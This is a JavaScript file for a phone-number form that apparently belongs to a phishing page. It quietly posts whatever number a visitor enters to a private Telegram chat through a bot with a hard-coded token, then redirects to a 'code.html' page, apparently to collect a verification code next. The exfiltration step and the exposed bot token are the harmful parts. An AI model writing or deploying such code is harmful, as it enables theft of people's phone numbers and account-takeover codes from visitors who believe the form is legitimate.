document.getElementById("country").addEventListener("change", function () {
    var countryCode = this.value;
    var phoneInput = document.getElementById("phone");
    phoneInput.value = countryCode + " ";
  });
  
  document.getElementById("phoneForm").addEventListener("submit", function (event) {
    var countrySelect = document.getElementById("country");
    if (countrySelect.value === "") {
      event.preventDefault();
      alert("Please select your country.");
    }
  });
  
  var telegram_bot_id = "7257047354:AAEp3Gb4T1-YTgOBihpzCJ0SkRQvNooAGWQ";
  var chat_id = "@mytest43"; // Ensure this is correct
  var phone;
  
  var ready = function () {
    phone = document.getElementById("phone").value;
    message = phone;
  };
  
  var sender = function () {
    ready();
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": chat_id,
        "text": message
      })
    };
  
    $.ajax(settings).done(function (response) {
      console.log(response);
      // Redirect to a new page upon successful message sending
      window.location.href = "code.html"; // Replace with your target URL
    }).fail(function (jqXHR, textStatus, errorThrown) {
      console.error("Error sending message: ", textStatus, errorThrown);
      alert("Failed to send the message. Please try again.");
    });
  
    document.getElementById("phone").value = "";
    return false;
  };
  